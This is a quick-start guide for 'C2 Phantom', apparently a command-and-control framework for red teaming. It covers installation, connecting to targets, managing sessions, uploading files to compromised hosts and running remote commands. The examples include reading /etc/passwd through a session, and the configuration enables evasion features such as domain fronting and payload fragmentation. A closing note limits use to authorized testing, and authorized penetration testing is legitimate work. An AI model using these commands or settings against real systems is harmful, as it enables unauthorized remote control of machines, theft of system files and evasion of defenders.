# 🚀 C2 Phantom - Quick Start Guide

Get started with C2 Phantom in just a few minutes!

## Installation

### Option 1: Install from PyPI (Recommended)

```bash
pip install c2-phantom
```

### Option 2: Install from Source

```bash
# Clone repository
git clone https://github.com/redteam/c2-phantom.git
cd c2-phantom

# Create virtual environment
python -m venv venv

# Activate virtual environment
# Windows:
venv\Scripts\activate
# Linux/macOS:
source venv/bin/activate

# Install package
pip install -e .
```

### Option 3: Docker

```bash
docker pull c2-phantom:latest
docker run -it c2-phantom:latest phantom --help
```

## First Steps

### 1. Initialize C2 Phantom

```bash
phantom init
```

This will:
- Create configuration file at `~/.phantom/config.yaml`
- Generate encryption keys (RSA, ECC, AES)
- Set up directory structure

### 2. Verify Installation

```bash
phantom --version
```

### 3. Connect to a Target

```bash
phantom connect https://target.example.com --protocol https --encrypt aes256
```

### 4. List Active Sessions

```bash
phantom list --status active
```

### 5. Upload a File

```bash
phantom upload local.txt /remote/path/file.txt --session <SESSION_ID>
```

### 6. Execute a Command

```bash
phantom execute "whoami" --session <SESSION_ID> --output
```

## Configuration

Edit `~/.phantom/config.yaml` to customize:

```yaml
server:
  host: 0.0.0.0
  port: 443
  tls_enabled: true

encryption:
  default_algorithm: aes256-gcm
  key_size: 256
  forward_secrecy: true

network:
  protocols:
    - https
    - dns
    - websocket
  jitter_min: 500
  jitter_max: 2000

evasion:
  domain_fronting: true
  payload_fragmentation: true

logging:
  level: INFO
  file: ~/.phantom/logs/phantom.log
```

## Common Commands

```bash
# Initialize
phantom init

# Show help
phantom --help
phantom connect --help

# Connect with options
phantom connect https://target.com \
  --protocol https \
  --encrypt aes256 \
  --proxy http://proxy:8080 \
  --jitter 1000

# List sessions
phantom list
phantom list --status active --verbose
phantom list --format json

# Manage plugins
phantom plugin list
phantom plugin install my_plugin
phantom plugin info example

# Upload with progress
phantom upload file.txt /remote/file.txt \
  --session <ID> \
  --encrypt \
  --progress

# Execute commands
phantom execute "ls -la" --session <ID> --output
phantom execute "cat /etc/passwd" --session <ID> --async
```

## Plugin Development

Create custom plugins in `~/.phantom/plugins/`:

```python
# ~/.phantom/plugins/my_plugin.py

from c2_phantom.plugins.base import CommandPlugin

class MyPlugin(CommandPlugin):
    name = "my_plugin"
    version = "1.0.0"
    description = "My custom plugin"
    author = "Your Name"
    
    def initialize(self) -> None:
        self.register_command("hello", self.hello_cmd, "Say hello")
    
    def cleanup(self) -> None:
        pass
    
    def hello_cmd(self, name: str = "World") -> str:
        return f"Hello, {name}!"

plugin_class = MyPlugin
```

## Environment Variables

```bash
# Set custom config path
export PHANTOM_CONFIG=~/custom/config.yaml

# Set log level
export PHANTOM_LOG_LEVEL=DEBUG

# Set plugin directory
export PHANTOM_PLUGIN_DIR=~/custom/plugins
```

## Troubleshooting

### Import Errors

```bash
# Reinstall dependencies
pip install -r requirements.txt
```

### Permission Issues

```bash
# Linux/macOS - Run with sudo for system-level operations
sudo phantom init

# Windows - Run PowerShell as Administrator
```

### Key Storage Issues

```bash
# Check key storage
ls ~/.phantom/keys/

# Regenerate keys
phantom init --force
```

## Next Steps

1. Read the [Full Documentation](README.md)
2. Check [Examples](examples/)
3. Join the community
4. Report issues on GitHub

## Security Reminder

⚠️ **IMPORTANT**: C2 Phantom is for AUTHORIZED security testing only!

- Always obtain proper authorization
- Use only in controlled environments
- Comply with all applicable laws
- Never use for malicious purposes

## Support

- 📖 Documentation: [README.md](README.md)
- 🐛 Issues: [GitHub Issues](https://github.com/redteam/c2-phantom/issues)
- 💬 Discord: [Join our server](https://discord.gg/phantom)
- 📧 Email: phantom@redteam.local

---

**Happy (ethical) hacking! 🔮**
